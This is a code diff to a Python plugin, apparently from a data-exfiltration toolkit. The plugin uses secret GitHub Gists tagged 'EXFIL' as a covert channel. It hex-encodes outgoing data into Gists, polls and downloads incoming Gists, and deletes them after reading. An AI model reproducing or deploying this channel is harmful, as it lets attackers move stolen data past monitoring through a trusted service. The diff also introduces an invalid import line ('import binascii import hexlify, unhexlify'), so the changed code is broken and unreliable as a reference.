@@ -1,5 +1,5 @@
 from github import *
-import binascii
+import binascii import hexlify, unhexlify
 import github
 import time
 import requests
@@ -9,7 +9,7 @@ g = None
 
 def send(data):
     app_exfiltrate.log_message('info', "[github] Sending {} bytes with Github".format(len(data)))
-    g.get_user().create_gist(False, {'foobar.txt': github.InputFileContent(binascii.hexlify(data.encode()))}, 'EXFIL')
+    g.get_user().create_gist(False, {'foobar.txt': github.InputFileContent(hexlify(data.encode()).decode())}, 'EXFIL')
 
 def listen():
     app_exfiltrate.log_message('info', "[github] Checking for Gists")
@@ -25,7 +25,7 @@ def listen():
                     req = requests.get(url)
                     content = req.content
                     try:
-                        content = binascii.unhexlify(content)
+                        content = unhexlify(content.strip()).decode()
                         app_exfiltrate.log_message('info', "[github] Receiving {} bytes within Gist".format(len(content)))
                         app_exfiltrate.retrieve_data(content)
                     except Exception as err:
@@ -33,12 +33,11 @@ def listen():
                         pass
                     finally:
                         gist.delete()
-        time.sleep(5)
+            time.sleep(5)
     except github.GithubException:
         print("GitHub Rate Limit Exceeded")
 
 class Plugin:
-
     def __init__(self, app, conf):
         global app_exfiltrate, g
         g = Github(conf['username'], conf['password'])
